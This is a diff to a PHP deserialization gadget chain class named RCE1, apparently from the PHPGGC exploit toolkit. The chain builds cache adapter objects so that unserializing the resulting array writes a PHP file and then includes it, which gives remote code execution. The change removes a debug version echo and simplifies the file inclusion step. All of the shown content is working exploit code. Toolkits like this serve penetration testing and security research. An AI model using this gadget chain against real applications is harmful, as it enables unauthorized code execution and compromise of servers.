@@ -59,7 +59,6 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
             $firstCacheItem = new TypedCacheItem();
             $secondCacheItem = new TypedCacheItem();
         }
-        echo phpversion();
 
         /* File write */
         $obj_write = new CacheAdapter();
@@ -71,12 +70,9 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
         
         /* File inclusion */
         $obj_include = new CacheAdapter();
-        $proxyAdapter = new ProxyAdapter();
-        $proxyAdapter->pool = new PhpArrayAdapter();
-        $obj_include->cache = $proxyAdapter;
-        $cacheItem = $secondCacheItem;
-        $cacheItem->expiry = 0; // mandatory to go to another branch from CacheAdapter __destruct
-        $obj_include->deferredItems = [$cacheItem];
+        $obj_include->cache = new PhpArrayAdapter();
+        $secondCacheItem->expiry = 0; // mandatory to go to another branch from CacheAdapter __destruct
+        $obj_include->deferredItems = [$secondCacheItem];
         $obj = [1000 => $obj_write, 1001 => 1, 2000 => $obj_include, 2001 => 1];
         return $obj;
     }
